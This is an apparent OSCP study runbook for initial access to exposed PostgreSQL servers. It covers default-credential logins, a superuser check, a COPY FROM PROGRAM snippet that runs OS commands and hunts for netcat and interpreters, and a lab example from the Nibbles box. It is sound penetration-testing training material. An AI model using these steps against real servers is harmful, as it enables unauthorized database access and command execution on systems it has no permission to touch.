---
tags: [oscp, postgresql, runbook]
box_sources: [Nibbles]
---

# PostgreSQL — Initial Access

*PostgreSQL is exposed (default port 5432 or non-standard). Try default credentials first, then enumerate what privileges you have.*

---

| Command | Evidence | Works when | Notes | ✅ Go to | ❌ If nothing works |
|---|---|---|---|---|---|
| `psql -h $BoxIP -p 5437 -U postgres` (password: `postgres`) | `postgres=#` prompt | Default creds not changed | Non-standard port common on OSCP boxes (5437 instead of 5432). Try `postgres:postgres`, `postgres:` (blank), `postgres:$BoxName`. | Check superuser | Auth failed → [[Creds - Password Spray]] against postgres user |
| `SELECT current_setting('is_superuser');` | `on` | Connected as postgres | Must be superuser for COPY TO PROGRAM RCE. If `off`, look for UDF or other privesc paths inside DB. | [[PostgreSQL - COPY TO PROGRAM RCE]] | `off` → limited DB access only, look elsewhere |

---

## Tool Discovery Without a Shell (COPY FROM PROGRAM pattern)

When connected as superuser but no shell yet, use COPY FROM PROGRAM to read command output into a table:

```sql
CREATE TABLE cmd_out (output text);
COPY cmd_out FROM PROGRAM 'ls /usr/bin/python* /usr/bin/perl /usr/bin/nc* /bin/nc* 2>/dev/null; echo done';
SELECT * FROM cmd_out;
DROP TABLE cmd_out;
```

Key: append `; echo done` to guarantee exit code 0 — COPY FROM PROGRAM bails on any non-zero exit and returns an error instead of your output.

---

## Nibbles Example (PG Practice)

```bash
# Non-standard port found in nmap -sV scan
psql -h $BoxIP -p 5437 -U postgres
# Password: postgres
# Connected — postgres=# prompt

# Confirm superuser
SELECT current_setting('is_superuser');  -- on

# Proceed to COPY TO PROGRAM RCE
```

---

## Module Links

[[06. Information Gathering]] | [[10. SQL Injection Attacks]]
## External Resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [RevShells](https://www.revshells.com/) for reverse-shell selection
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for practical walkthrough searches
